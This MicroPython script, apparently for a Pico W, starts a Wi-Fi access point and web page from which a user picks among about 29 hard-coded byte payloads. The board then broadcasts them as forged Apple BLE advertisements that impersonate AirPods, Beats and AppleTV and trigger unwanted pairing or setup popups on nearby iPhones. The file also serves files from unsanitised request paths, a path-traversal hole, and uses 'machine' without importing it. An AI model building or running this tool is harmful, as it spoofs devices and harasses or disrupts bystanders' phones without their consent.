import uselect as select
import usocket as socket
import ujson as json
import network
import bluetooth
import time
from machine import Pin
from utime import sleep

led = machine.Pin('LED', machine.Pin.OUT) 

############################################### ACCESS POINT MODE CONFIGURATION ###############################################
# UNCOMMENT THESE LINES TO USE ACCESS POINT MODE.
def read_ap_config():
    try:
        with open('ap.json', 'r') as f:
            config = json.load(f)
            return config['ssid'], config['password']
    except Exception as e:
        print("Error al leer ap.json:", e)
        return None, None

ssid, password = read_ap_config()

if ssid and password:
    ble = bluetooth.BLE()
    ble.active(True)

    ap = network.WLAN(network.AP_IF)
    print("Configuring AP...")
    ap.config(essid=ssid, password=password)
    print("Activating AP...")
    ap.active(True)

    while not ap.active():
        print("Waiting for AP to activate...")
        sleep(1) 

    print("Access point active")
    print(ap.ifconfig())
else:
    print("ops! no ap.json file found!.")
############################################### ACCESS POINT MODE CONFIGURATION ###############################################

############################################### STATION MODE CONFIGURATION ####################################################
# UNCOMMENT THESE LINES TO CONNECT TO YOUR WIFI.
# try:
#     with open('st.json', 'r') as f:
#         config = json.load(f)
#         ssid = config['ssid']
#         password = config['password']
# except Exception as e:
#     print("ops! no ap.json file found!:", e)
# sta_if = network.WLAN(network.STA_IF)
# print('Connecting to network...')
# sta_if.active(True)
# sta_if.connect(ssid, password)
# while not sta_if.isconnected():
#     pass
# print('Network config:', sta_if.ifconfig())
############################################### STATION MODE CONFIGURATION ####################################################

def start_advertising(bt_data, interval):
    print("Starting advertising...")
    ble.gap_advertise(interval, adv_data=bt_data)

def stop_advertising():
    print("Stopping advertising...")
    ble.gap_advertise(None)

payload_names = [
    "Airpods", "Airpods Pro", "Airpods Max", "Airpods Gen 2", "Airpods Gen 3",
    "Airpods Pro Gen 2", "PowerBeats", "PowerBeats Pro", "Beats Solo Pro", 
    "Beats Studio Buds", "Beats Flex", "BeatsX", "Beats Solo3", "Beats Studio3",
    "Beats Studio Pro", "Beats Fit Pro", "Beats Studio Buds+", "AppleTV Setup",
    "AppleTV Pair", "AppleTV New User", "AppleTV AppleID Setup", "AppleTV Wireless Audio Sync",
    "AppleTV Homekit Setup", "AppleTV Keyboard", "AppleTV 'Connecting to Network'",
    "Homepod Setup", "Setup New Phone", "Transfer Number to New Phone", "TV Color Balance"
]
payloads = [
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
    bytearray([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00]),
]

def send_html(client_sock):
    with open('index.html', 'r') as html_file:
        html_template = html_file.read()

    payload_options = "".join(f'<option value="{i}">{name}</option>' for i, name in enumerate(payload_names))
    html_content = html_template.replace("{payload_options}", payload_options)

    client_sock.write("HTTP/1.1 200 OK\r\n")
    client_sock.write("Content-Type: text/html\r\n")
    client_sock.write("Content-Length: {}\r\n".format(len(html_content)))
    client_sock.write("\r\n")
    client_sock.write(html_content)

def serve_static_file(file_path, client_sock):
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        
        if file_path.endswith(".png"):
            mime_type = "image/png"
        elif file_path.endswith(".ico"):
            mime_type = "image/x-icon"
        elif file_path.endswith(".css"):
            mime_type = "text/css"
        elif file_path.endswith(".js"):
            mime_type = "application/javascript"
        else:
            mime_type = "application/octet-stream"
        
        client_sock.write("HTTP/1.1 200 OK\r\n")
        client_sock.write(f"Content-Type: {mime_type}\r\n")
        client_sock.write(f"Content-Length: {len(content)}\r\n")
        client_sock.write("\r\n")
        client_sock.write(content)
    except Exception as e:
        client_sock.write("HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nFile not found")

def handle_request(request, client_sock):
    if request.startswith("GET / "):
        send_html(client_sock)
    elif request.startswith("POST /start"):
        try:
            payload_index_str = request.split("payload=")[1].split("&")[0]
            payload_index = int(payload_index_str)
            if payload_index < 0 or payload_index >= len(payloads):
                raise ValueError("Invalid payload index")
            
            bt_data = payloads[payload_index]
            start_advertising(bt_data, 200)
            
            client_sock.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nStarted BLE Advertising")
        except (IndexError, ValueError) as e:
            client_sock.write("HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nInvalid request: " + str(e))
    elif request.startswith("POST /stop"):
        stop_advertising()
        client_sock.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nStopped BLE Advertising")
    elif request.startswith("GET /assets/"):
        file_path = request.split(" ")[1][1:] 
        serve_static_file(file_path, client_sock)

poller = select.poll()
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 80))
server_socket.listen(5)
print("Access point active")
print(ap.ifconfig())
led.on()  
print("Web server is up and running!")

poller.register(server_socket, select.POLLIN)

while True:
    res = poller.poll(1000)  
    for sock, event in res:
        if sock is server_socket:
            client_sock, addr = server_socket.accept()
            print("Client connected:", addr)
            poller.register(client_sock, select.POLLIN)
        elif event & select.POLLIN:
            request = sock.recv(1024).decode("utf-8")
            handle_request(request, sock)
            poller.unregister(sock)
            sock.close()
